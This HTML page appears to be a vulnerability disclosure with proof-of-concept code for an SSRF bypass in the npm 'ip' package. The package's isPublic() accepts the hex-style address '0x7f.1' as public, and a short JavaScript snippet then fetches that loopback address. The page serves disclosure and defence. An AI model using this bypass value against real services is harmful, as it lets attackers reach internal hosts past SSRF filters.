<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SSRF Vulnerability Proof of Concept</title>
</head>
<body>




<h1>SSRF Vulnerability Proof of Concept</h1>

<pre>
Software: https://www.npmjs.com/package/ip
Version: <= 1.1.8
Vulnerabilty: SSRF
CVE: N/A
Description of the vulnerability:
We have discovered some missing control in your isPublic() function for identifying Public and Private IP address. 
As you know, you can specify IP addresses with different formats such as 0x7f1, 127.1, 127.0.0.1. We realized that isPublic() function returns true some of the private IP addresses. 
Because of this vulnerability, attackers can bypass some SSRF mitigations.
</pre>

    
 <pre>
        var ip = require('ip');
        console.log(ip.isPublic("0x7f.1")); // true

        // Check IP and IF IP is not public do HTTP req ==> SSRF
        var my_ip = "0x7f.1"; // private but ip package doesn't recognize as private!
        // var my_ip2 = "google.com"; // public --> fetch will be completed
        // var my_ip3 = "127.0.0.1"; // private --> else statement will be run

        if (ip.isPublic(my_ip)) {
            fetch("http://" + my_ip).then((response) => {
                console.log(response);
            });
        } else {
            console.log("IP is not public");
        }
    </pre>
</body>
</html>
